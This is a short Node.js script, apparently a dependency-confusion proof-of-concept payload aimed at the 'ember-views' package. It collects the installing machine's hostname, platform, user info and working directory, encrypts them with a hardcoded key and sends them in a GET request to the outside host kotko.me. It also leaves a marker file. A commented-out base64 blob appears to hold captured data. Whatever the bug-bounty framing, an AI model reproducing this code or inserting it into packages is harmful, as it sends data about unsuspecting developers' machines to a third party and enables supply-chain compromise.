var os = require("os");
const request = require('request');
const crypto = require('crypto');
var fs = require('fs');


var hostname = os.hostname();
var type = os.platform();
var userInfo = os.userInfo();
var currentPath = process.cwd();
var json = [];


const algorithm = 'aes-256-ctr';
const secretKey = 'vOVH6sdmpNWjRRIqCc7rdxs01lwHzfr3';
const iv = crypto.randomBytes(16);

json.push(hostname)
json.push(type)
json.push(userInfo)
json.push(currentPath)
json = JSON.stringify(json);
const { encrypt, decrypt } = require('./crypto');

let hash = encrypt(json);


let company = "zendesk/ember.js/packages/ember/package.json"
let packages = "ember-views"

fs.writeFile('pocByKotko.txt', 'this proof for bug', function (err) {
  if (err) throw err;
});

// var dString = JSON.parse(Buffer.from("eyJpdiI6IjhmNDUyNzcyMmMxNTJkYWUyMmU2NDU0N2M4NTYwNjAzIiwiY29udGVudCI6IjU4ZjczYmEyOWQxODdiNTFhY2Q4N2Q1ODg1ZTY0MGIxMTg4NjczMTA2NTAxMjY4MTE0NDdlMjU1ZjhhZDE3YjYwZDFjNmNiOWFiNTM0OWMyNWJjZTVlOTJiYTMwMmE2NzkzOWU3MmMyYjM1NzU0ZjZjNDNlNDI2ZjQ3ZWUxOTliY2NhNDhjYTAyNzBhZWMyZjQ0OGIyOWMwNzQzMGExYTZhOWQ1MDI5ZjcxNGVkMWU5NWZiYWE3Zjc4NjM0OGY2NGM2OWFiMGM5MzEwNmI3MzM2NmJmNTEyNGQxNDA0ODZjOTZlNDMzYzhjMGZmMjIxOTBlNTJlOWJlZTM4ZDUyOWRjNGEzYjdlMTNlMzcwZDg2MWVlNzJkNzZhZmFkMWUyMTRiNDk5YzU4MzliMWMwYzc1ZGYyYTBlN2U2ZWQxNGU3MGMzNTVmZTdlMjZkNjNkMDgyZmFjZmNkNDg4Mzc2MGUwMDYwNWI0Yjg2OTgzNzY3YTYxYWQ3MjM2NGE1NGMwNjkyY2JlYzgxMjNkNzg0Yzc5NmY0ZmEyYTcwMTI4M2JlZjg2NmM5Mzg0YTU2YmMyYjlhZmE1MjdiZDZhYTJjMjVhMTc5MTI0MjFjNGJhNWNkODViOGM3NWRkNDIxMzBiMmNlYTgxYmEwMmEzYzMyOGZhYyJ9", 'base64'))
//
// console.log(decrypt(dString))

var buff = Buffer.from(JSON.stringify(hash)).toString("base64");
request(`https://kotko.me/?${company}:${packages}=${buff}`, (error, response, body) => {})
